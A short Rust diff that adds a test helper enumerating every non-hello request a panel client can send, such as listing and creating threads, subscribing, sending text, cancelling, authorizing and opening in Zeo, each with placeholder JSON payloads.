+/// Every non-hello request a panel can send, each with a distinct request id.
+fn every_panel_request() -> Vec<(&'static str, Value)> {
+    vec![
+        ("list_threads", json!({})),
+        ("create_thread", json!({})),
+        (
+            "subscribe",
+            json!({ "target": { "thread_id": "00000000-0000-0000-0000-000000000000" } }),
+        ),
+        ("subscribe", json!({ "target": { "follow": true } })),
+        ("send", json!({ "text": "x", "attachments": [] })),
+        ("cancel", json!({})),
+        ("authorize", json!({ "request_id": "q", "option_id": "o" })),
+        ("open_in_zeo", json!({})),
+    ]
+}
